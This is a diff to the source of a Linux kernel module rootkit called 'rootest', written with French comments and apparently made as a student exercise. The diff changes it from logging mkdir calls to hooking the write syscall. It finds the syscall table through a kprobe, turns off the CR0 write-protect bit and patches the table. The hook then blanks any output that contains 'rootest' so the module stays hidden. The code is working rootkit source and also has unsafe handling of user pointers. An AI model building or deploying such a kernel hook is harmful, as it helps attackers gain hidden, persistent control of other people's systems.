@@ -1,73 +1,62 @@
 #include "rootest.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("JB Poquelin");
+MODULE_AUTHOR("2600 student");
 MODULE_DESCRIPTION("HOOKING SYSCALL TABLE");
 MODULE_VERSION("0.01");
 
 unsigned long * __sys_call_table;
 
-/* pour régler de le kallsyms_lookup_name pas défini (déactivé par sécurité) */
+/* pour régler de le kallsyms_lookup_name pas défini (désactivé par sécurité) */
 struct kprobe kp_kln = {
     .symbol_name = "kallsyms_lookup_name"
 };
 
-/* Despite what's written in include/linux/syscalls.h,
- * we have to declare the original syscall as taking
- * a single pt_regs struct as an argument. This enables
- * us to unpack this struct in our hook syscall and access
- * the arguments that are being passed, while still being
- * able to just pass this struct on again to the real syscall
- * without any issues. This way, we don't have to unpack
- * EVERY argument from the struct - only the ones we care about.
- *
- * Note that asmlinkage is used to prevent GCC from being
- * "helpful" by allocation arguments on the stack */
-typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
-orig_mkdir_t orig_mkdir;
+typedef asmlinkage long (*orig_write_t)(struct pt_regs *);
+orig_write_t orig_write;
 
-/* This is our function hook.
- *
- * Getting this to work is a little awkward. We have to un-pack
- * the arguments from the pt_regs struct in order to be able to
- * reference the new directory name without getting a null-pointer
- * dereference.
- *
- * The pt_regs struct contains all the arguments passed to the syscall
- * in each register. Looking up sys_mkdir, pathname is stored in rdi, so
- * simply dereferencing regs->di gives the pathname argument.
- * See arch/x86/include/asm/ptrace.h for more info.
- *
- * Note that we call the real sys_mkdir() function at the end */
-asmlinkage int hook_mkdir(const struct pt_regs *regs)
+asmlinkage int hook_write(struct pt_regs *regs)
 {
-    char __user *pathname = (char *)regs->di;
-    char dir_name[NAME_MAX] = {0};
-
-    /* Copy the directory name from userspace (pathname, from
-     * the pt_regs struct, to kernelspace (dir_name) so that we
-     * can print it out to the kernel buffer */
-    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
-
-    if (error > 0)
-        printk(KERN_INFO "rootkit: Trying to create directory with name: %s\n", dir_name);
-
-    /* Pass the pt_regs struct along to the original sys_mkdir syscall */
-    orig_mkdir(regs);
-    return 0;
+    /* récupérer les paramètres de write depuis les registres */
+    int *fd = (int *)regs->di;
+    char __user *buf = (char *)regs->si;
+    int *count = (int *)regs->dx;
+        
+    /* Regarde si le pattern existe dans le buffer */
+    char *pattern = "rootest";
+    char *pos = strstr(buf, pattern);
+    
+    //printk(KERN_INFO "rootkit: fd %d\n", fd);
+    //printk(KERN_INFO "rootkit: buf 0x%lx\n", buf);
+    //printk(KERN_INFO "rootkit: count %d\n", count);
+    //printk(KERN_INFO "rootkit: pattern %s\n", pattern);
+    //printk(KERN_INFO "rootkit: buf_char %s\n", buf);
+    
+    if (pos != NULL) {
+        //char *k_buf = (char*)kmalloc(count,GFP_KERNEL);
+	//memset(k_buf,0,count);
+	//copy_to_user(regs->di,k_buf,count);
+        //kfree(k_buf);
+ 	//asm volatile("xorq %%rsi, %%rsi" : : );
+	//clear_user((char __user *)buf, count);
+        //copy_to_user((void __user *)buf, 0, count);
+        memset(regs->si, 0, count);
+        //regs->si = 0;
+        //regs->dx = 1;
+    }
+    
+    /* appel du vrai sys_call write avec les nouveaux arguments */
+    return orig_write(regs);
 }
 
-/* The built in linux write_cr0() function stops us from modifying
- * the WP bit, so we write our own instead */
+/* la fonction normale write_cr0() empêche par sécurité de modifier le WriteProtect Bit */
 inline void cr0_write(unsigned long cr0)
 {	
     unsigned long __force_order;
     asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
 }
 
-/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
- * determines whether read-only pages can be written to. We are modifying
- * the syscall table, so we need to unset it first */
+/* le bit n°16 dans le registre cr0 détermine la protection des pages */
 inline void protect_memory(void)
 {
     unsigned long cr0 = read_cr0();
@@ -91,21 +80,20 @@ int __init rootkit_init_hook(void)
     register_kprobe(&kp_kln);
     kallsyms_lookup_name = (kallsyms_lookup_name_t) kp_kln.addr;
     unregister_kprobe(&kp_kln);
-    /* Grab the syscall table, and make sure we succeeded */
+    
+    
     __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 
-    /* Grab the function pointer to the real sys_mkdir syscall */
-    orig_mkdir = (orig_mkdir_t)__sys_call_table[__NR_mkdir];
+    /* récupération du pointeur sur le vrai syscall */
+    orig_write = (orig_write_t)__sys_call_table[__NR_write];
 
-    printk(KERN_INFO "rootkit: Loaded >:-)\n");
-    printk(KERN_INFO "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
-    printk(KERN_INFO "rootkit: mkdir @ 0x%lx\n", orig_mkdir);
+    printk(KERN_INFO "rootkit: syscall table à 0x%lx\n", __sys_call_table);
+    printk(KERN_INFO "rootkit: write syscall à 0x%lx\n", orig_write);
     
     unprotect_memory();
 
-    printk(KERN_INFO "rootkit: hooking mkdir syscall\n");
-    /* Patch the function pointer to sys_mkdir with our hook instead */
-    __sys_call_table[__NR_mkdir] = (unsigned long)hook_mkdir;
+    /* changement du pointeur de sys_write vers le hook */
+    __sys_call_table[__NR_write] = (unsigned long)hook_write;
 
     protect_memory();
 
@@ -116,10 +104,8 @@ void __exit rootkit_exit_hook(void)
 {
     unprotect_memory();
     
-    printk(KERN_INFO "rootkit: restoring mkdir syscall\n");
-    __sys_call_table[__NR_mkdir] = (unsigned long)orig_mkdir;
+    printk(KERN_INFO "rootkit: restauration write syscall\n");
+    __sys_call_table[__NR_write] = (unsigned long)orig_write;
     
     protect_memory();
-    
-    printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
